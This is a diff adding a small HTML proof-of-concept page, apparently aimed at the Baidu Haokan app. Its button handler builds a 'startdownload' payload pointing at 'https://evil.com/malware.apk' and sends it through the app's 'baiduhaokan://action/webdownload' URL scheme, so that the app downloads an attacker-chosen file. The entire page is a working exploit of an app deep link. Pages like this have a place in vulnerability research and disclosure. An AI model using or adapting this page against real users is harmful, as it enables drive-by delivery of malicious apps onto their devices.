@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Test</title>
+</head>
+<body>
+    <h2>下载测试</h2>
+    <button onclick="startDownload()">触发下载</button>
+    
+    <script>
+    function startDownload() {
+        var params = {
+            "type": "startdownload",
+            "url": "https://evil.com/malware.apk",
+            "file_id": "test_123",
+            "callback": "downloadCallback",
+            "ext_info": ""
+        };
+        
+        var url = 'baiduhaokan://action/webdownload?params=' + encodeURIComponent(JSON.stringify(params));
+        window.location = url;
+        
+        alert('触发: ' + url);
+    }
+    </script>
+</body>
+</html>
